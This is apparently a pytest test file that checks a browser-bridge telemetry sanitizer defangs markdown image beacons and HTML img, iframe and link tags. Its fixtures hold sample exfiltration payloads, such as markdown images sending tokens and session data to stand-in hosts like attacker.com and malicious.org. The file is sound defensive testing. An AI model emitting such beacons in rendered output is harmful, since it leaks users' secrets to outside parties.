"""Unit tests for structured telemetry serialization and markdown beacon exfiltration defense."""

import pytest
from chrome_sdk import (
    defang_telemetry_payload,
    ChromeBridgeWorkerTelemetry,
)


def test_defang_markdown_image_beacon():
    raw_md = "Here is the summary of items:\n![Tracking Beacon](https://attacker.com/leak?token=secret123)\nDone."
    defanged = defang_telemetry_payload(raw_md)
    assert "![Tracking Beacon]" not in defanged
    assert "[IMAGE_BLOCKED: Tracking Beacon | https://attacker.com/leak?token=secret123]" in defanged


def test_defang_html_tags():
    raw_html = '<p>Normal text</p><img src="https://evil.com/beacon.png" width="1" height="1"/><iframe src="http://phish.com"></iframe><link rel="stylesheet" href="http://evil.com/leak.css">'
    defanged = defang_telemetry_payload(raw_html)
    assert "<img" not in defanged
    assert "<iframe" not in defanged
    assert "<link" not in defanged
    assert "[TAG_BLOCKED:" in defanged


def test_defang_recursive_structures():
    nested_data = {
        "title": "Search Results",
        "items": [
            {"name": "Item 1", "image": "![Thumb](https://cdn.example.com/img.jpg)"},
            {"name": "Item 2", "snippet": 'Embedded <img src="http://tracker.com/t.gif"/>'},
        ],
        "meta": {
            "query": "laptop",
            "injection": "![exfil](https://malicious.org/q?data=user_session_token)",
        },
    }
    defanged = defang_telemetry_payload(nested_data)
    assert "[IMAGE_BLOCKED: Thumb | https://cdn.example.com/img.jpg]" in defanged["items"][0]["image"]
    assert "[TAG_BLOCKED:" in defanged["items"][1]["snippet"]
    assert "[IMAGE_BLOCKED: exfil | https://malicious.org/q?data=user_session_token]" in defanged["meta"]["injection"]


def test_chrome_bridge_worker_telemetry_schema():
    telemetry = ChromeBridgeWorkerTelemetry(
        tab_id=1,
        origin="https://github.com",
        url="https://github.com/pulls",
        title="Pull Requests",
        status="success",
        extracted_data={"prs": [{"title": "Fix bug", "beacon": "![b](https://evil.com/b)"}]},
        count=1,
        execution_ms=45.2,
        media_state=None,
        error=None,
    )
    payload = telemetry.to_dict()
    assert payload["tab_id"] == 1
    assert payload["origin"] == "https://github.com"
    assert payload["status"] == "success"
    # Ensure defanging is applied automatically to extracted_data
    assert "[IMAGE_BLOCKED: b | https://evil.com/b]" in payload["extracted_data"]["prs"][0]["beacon"]
